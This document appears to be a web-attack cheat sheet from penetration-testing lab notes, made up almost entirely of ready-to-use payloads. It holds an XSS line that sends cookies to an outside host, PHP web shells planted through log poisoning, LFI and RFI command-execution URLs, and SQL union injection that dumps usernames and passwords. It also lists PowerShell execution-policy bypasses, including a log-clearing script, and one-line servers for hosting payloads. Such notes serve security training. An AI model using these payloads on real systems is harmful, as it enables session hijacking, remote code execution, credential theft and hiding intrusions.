#### XSS

`<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>`

`powershell -ExecutionPolicy Bypass -File clear_logs.ps1`

`powershell -ExecutionPolicy Bypass -File admin_login.ps1`

### LOG POISONING

```
nc -nv 10.11.0.22 80
(UNKNOWN) [10.11.0.22] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

```
### LFI

`http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`

### Running a server

`<?php echo shell_exec($_GET['cmd']); ?>`

`python -m SimpleHTTPServer 7331`

`python3 -m http.server 7331`

`php -S 0.0.0.0:8000`

`ruby -run -e httpd . -p 9000`

`busybox httpd -f -p 10000`

### PHP data wrapper used with LFI

`http://192.168.175.10/menu.php?file=data:text/plain,%3C?php%20echo%20shell_exec(%22dir%22)%20?%3E`

### RFI

`http://192.168.175.10/menu2.php?cmd=ipconfig&file=http://192.168.119.175/evil.txt?`

`http://192.168.175.10/menu.php?cmd=ipconfig&file=http://192.168.119.175/evil.txt`

### SQL Injection

```

jim' or 1=1 limit 1;#


http://10.11.0.22/debug.php?id=1 order by 1

http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3

http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version 

http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()

http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables

http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'

http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users



```
